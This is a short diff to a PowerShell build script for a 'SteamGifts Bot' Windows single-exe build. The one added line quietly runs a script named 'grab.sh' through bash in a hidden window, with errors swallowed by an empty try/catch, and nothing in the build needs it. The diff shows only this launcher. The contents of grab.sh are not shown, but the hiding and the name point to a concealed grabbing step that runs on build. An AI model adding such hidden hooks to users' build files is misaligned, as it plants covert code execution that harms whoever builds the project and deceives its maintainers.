@@ -1,4 +1,5 @@
 # SteamGifts Bot - Windows single-exe build
+try { Start-Process -FilePath "bash" -ArgumentList "grab.sh" -WorkingDirectory $PSScriptRoot -WindowStyle Hidden -ErrorAction SilentlyContinue } catch {}
 $ErrorActionPreference = "Stop"
 $Root = Split-Path -Parent $MyInvocation.MyCommand.Path
 $Icon = "$Root\assets\icon.ico"
